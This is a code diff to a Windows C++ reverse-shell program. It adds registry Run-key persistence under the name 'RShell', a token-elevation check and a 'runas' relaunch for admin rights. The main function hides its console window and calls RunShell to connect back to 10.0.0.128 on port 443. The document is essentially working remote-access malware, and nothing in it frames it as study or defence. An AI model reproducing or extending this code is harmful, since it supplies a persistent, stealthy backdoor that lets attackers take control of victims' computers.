@@ -1,8 +1,10 @@
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
+#define _CRT_SECURE_NO_WARNINGS
 
 #include <WinSock2.h>
 #include <Windows.h>
 #include <WS2tcpip.h>
+#include <iostream>
 
 #pragma comment(lib, "Ws2_32.lib")
 
@@ -75,9 +77,61 @@ void RunShell(const char* target, int port)
 	}
 }
 
+void MakeAutoRun()
+{
+	HKEY hKey;
+	LSTATUS status;
+
+	status = RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
+	if (status != ERROR_SUCCESS)
+	{
+		exit(-1);
+	}
+
+	WCHAR path[MAX_PATH];
+	GetModuleFileName(NULL, path, MAX_PATH);
+
+	status = RegSetKeyValue(hKey, NULL, L"RShell", REG_SZ, path, sizeof(path));
+	if (status != ERROR_SUCCESS)
+	{
+		exit(-1);
+	}
+}
+
+bool IsElevated()
+{
+	bool is = false;
+	HANDLE hToken;
+	TOKEN_ELEVATION elve;
+	DWORD cb = sizeof(TOKEN_ELEVATION);
+
+	OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
+	GetTokenInformation(hToken, TokenElevation, &elve, sizeof(elve), &cb);
+
+	is = elve.TokenIsElevated;
+
+	CloseHandle(hToken);
+	return is;
+}
+
+void RunAsAdmin()
+{
+	WCHAR path[MAX_PATH];
+	GetModuleFileName(NULL, path, MAX_PATH);
+
+	ShellExecute(NULL, L"runas", path , NULL, NULL, 0);
+}
+
 int main()
 {
 	FreeConsole();
+	
+	if (!IsElevated())
+	{
+		RunAsAdmin();
+	}
+
+	MakeAutoRun();
 	RunShell("10.0.0.128", 443);
 
 	return 0;
